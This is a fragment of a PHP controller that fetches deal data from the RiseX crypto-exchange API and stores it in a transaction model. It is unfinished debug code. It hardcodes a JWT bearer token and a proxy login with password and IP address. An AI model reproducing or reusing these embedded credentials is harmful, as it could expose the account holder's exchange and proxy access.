		$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjQ2M2Y4MGVlZmFiYzQ2NDI4MGM3YjAxNzg1NjhjYzNjZDE2NTM3NjMxNTJkMjZiNmNmODNmNjY0ZTNhZTcwNGY4NGI2YmRlNTcwMjdlZTAwIn0.eyJhdWQiOiIxIiwianRpIjoiNDYzZjgwZWVmYWJjNDY0MjgwYzdiMDE3ODU2OGNjM2NkMTY1Mzc2MzE1MmQyNmI2Y2Y4M2Y2NjRlM2FlNzA0Zjg0YjZiZGU1NzAyN2VlMDAiLCJpYXQiOjE1ODQ2MjY3NjAsIm5iZiI6MTU4NDYyNjc2MCwiZXhwIjoxNjE2MTYyNzYwLCJzdWIiOiIzMDg5Iiwic2NvcGVzIjpbXX0.xErmi1n1lXGPG0Jq_fEThuvMmfSZNEbW2iKu1s6FZJJgNWDuX6Qn3IhoR8P_2nsea9FwcvaP3vQwje5mi-neYrZKJpTJY1txQpi2iHSfOAK9H5nl-uEVCPvA4f767uKcLywQnTqLesbsyIoak7qcNVHPKfpuVPo1ci37dWt5N26I7nnyDYUBFA3Pl9YPmXJ1ulm8v-oeDwhU7KuDIDNhMgxwO082q4l4FO9eOLKV5hjGIlMBP2s0xOQFnA34BI48J8UrKtgWaV8SMcJMpakhAYXPMeYcYAEYN_5CG1g18c1eFDsh4dCbVNIPiG9AODMPgricNPf2ZAY7Y_ywtD9skZzM7uEQkk-Iisha4u2LrKEoe9cTW-bMmpl6LPzWb-FEqgnvwpfI09IohV91OGuJt0vXCUD37Jcm8vMSk_El9tH4aBzU2qaQ4x6hqDs-oE5CXQouUxzjU74jFFajOlndlW64DZ8B0LEtoTQm-4prSbBYg1kWWZ3b0MSB0j1LY3RXe2jFn3PahY1A9-ui6SgcRTWnwPmQ85twqIODDsriw-wecNONNtjl6J6O8REX4JgYxZLALxv9pKDXg3LUOsVnjz5_AfYhmKPJmagv6IOcvGE4Rp7Byu2XkBaEWFZFNU732I5IAo5b2f766sOOKkRj4sXlOt2vM-8fCBtg1RjwQfU';
		$sender->additionalHeaders = [
			'Content-Type: application/json',
			"Authorization: Bearer {$token}",
			"Accept: application/json"
		];


		$content = $sender->send($url, json_encode($postData), $proxy);

		$userAgent = 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0';


		var_dump($content);
		die;
	}

	public function actionDealList()
	{
		var_dump(RisexTransaction::saveDealList());
		die;

		$user = User::getUser();

		$api = new RiseXApi;
		$dataList = $api->dealList();

		if(!is_array($dataList))
			exit('not array');

		foreach($dataList['data'] as $key=>$data)
		{
			unset($data['author']); //кучу левой инфы по апи выгружают
			unset($data['offer']); //кучу левой инфы по апи выгружают
			unset($data['statistics']); //кучу левой инфы по апи выгружают

			$transactionInfo['id'] = $data['id'];
			$transactionInfo['paymentSystem'] = $data['payment_system']['title'];
			$transactionInfo['bankType'] = $data['ad']['banks'][0]['title'];
			$transactionInfo['currency'] = $data['currency']['title'];
			$transactionInfo['cryptoCurrency'] = $data['crypto_currency']['title'];
			$transactionInfo['cryptoAmount'] = $data['crypto_amount'];
			$transactionInfo['price'] = $data['price'];
			$transactionInfo['status'] = $data['status']['title'];
			$transactionInfo['bank'] = $data['bank']['title'];
			$transactionInfo['fiatAmount'] = $data['fiat_amount'];
			$transactionInfo['time'] = $data['time'];
			$transactionInfo['createdAt'] = $data['created_at'];
			$transactionInfo['commissionsOffer'] = $data['commissions']['offer'];
			$transactionInfo['commissionsClient'] = $data['commissions']['client'];

			var_dump($data);

			if(!$model = RisexTransaction::model()->findByAttributes(['transaction_id'=>$transactionInfo['id']]))
			{
				$model = new RisexTransaction;
				$model->date_add = time();
				$model->scenario = RisexTransaction::SCENARIO_ADD;

			}

			$model->transaction_id = $transactionInfo['id'];
			$model->payment_system = $transactionInfo['paymentSystem'];
			$model->bank_type = $transactionInfo['bankType'];
			$model->currency = $transactionInfo['currency'];
			$model->crypto_currency = $transactionInfo['cryptoCurrency'];
			$model->crypto_amount = $transactionInfo['cryptoAmount'];
			$model->price = $transactionInfo['price'];
			$model->fiat_amount = $transactionInfo['fiatAmount'];
			$model->commissions_offer = $transactionInfo['commissionsOffer'];
			$model->commissions_client = $transactionInfo['commissionsClient'];
			$model->created_at = strtotime($transactionInfo['createdAt']);
			$model->client_id = $user->client->id;
			$model->user_id = $user->id;
			$model->status = $transactionInfo['status'];
			$model->save();
		}

		die;


//		$sender = new Sender;
//		$sender->followLocation = true;
//		$sender->proxyType = 'http';
//		$proxy = 'yGAUfYWnM3:pytivcev@93.189.46.22:41573';
//
//		$url = 'https://api.risex.net/api/v1/deal';
//
//		$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjQ2M2Y4MGVlZmFiYzQ2NDI4MGM3YjAxNzg1NjhjYzNjZDE2NTM3NjMxNTJkMjZiNmNmODNmNjY0ZTNhZTcwNGY4NGI2YmRlNTcwMjdlZTAwIn0.eyJhdWQiOiIxIiwianRpIjoiNDYzZjgwZWVmYWJjNDY0MjgwYzdiMDE3ODU2OGNjM2NkMTY1Mzc2MzE1MmQyNmI2Y2Y4M2Y2NjRlM2FlNzA0Zjg0YjZiZGU1NzAyN2VlMDAiLCJpYXQiOjE1ODQ2MjY3NjAsIm5iZiI6MTU4NDYyNjc2MCwiZXhwIjoxNjE2MTYyNzYwLCJzdWIiOiIzMDg5Iiwic2NvcGVzIjpbXX0.xErmi1n1lXGPG0Jq_fEThuvMmfSZNEbW2iKu1s6FZJJgNWDuX6Qn3IhoR8P_2nsea9FwcvaP3vQwje5mi-neYrZKJpTJY1txQpi2iHSfOAK9H5nl-uEVCPvA4f767uKcLywQnTqLesbsyIoak7qcNVHPKfpuVPo1ci37dWt5N26I7nnyDYUBFA3Pl9YPmXJ1ulm8v-oeDwhU7KuDIDNhMgxwO082q4l4FO9eOLKV5hjGIlMBP2s0xOQFnA34BI48J8UrKtgWaV8SMcJMpakhAYXPMeYcYAEYN_5CG1g18c1eFDsh4dCbVNIPiG9AODMPgricNPf2ZAY7Y_ywtD9skZzM7uEQkk-Iisha4u2LrKEoe9cTW-bMmpl6LPzWb-FEqgnvwpfI09IohV91OGuJt0vXCUD37Jcm8vMSk_El9tH4aBzU2qaQ4x6hqDs-oE5CXQouUxzjU74jFFajOlndlW64DZ8B0LEtoTQm-4prSbBYg1kWWZ3b0MSB0j1LY3RXe2jFn3PahY1A9-ui6SgcRTWnwPmQ85twqIODDsriw-wecNONNtjl6J6O8REX4JgYxZLALxv9pKDXg3LUOsVnjz5_AfYhmKPJmagv6IOcvGE4Rp7Byu2XkBaEWFZFNU732I5IAo5b2f766sOOKkRj4sXlOt2vM-8fCBtg1RjwQfU';
//		$sender->additionalHeaders = [
//			'Content-Type: application/json',
//			"Authorization: Bearer {$token}",
//			"Accept: application/json"
//		];
//
//
//		$content = $sender->send($url, false, $proxy);
//
//		$userAgent = 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0';
//
//
//		var_dump($content);
//		die;
	}

}
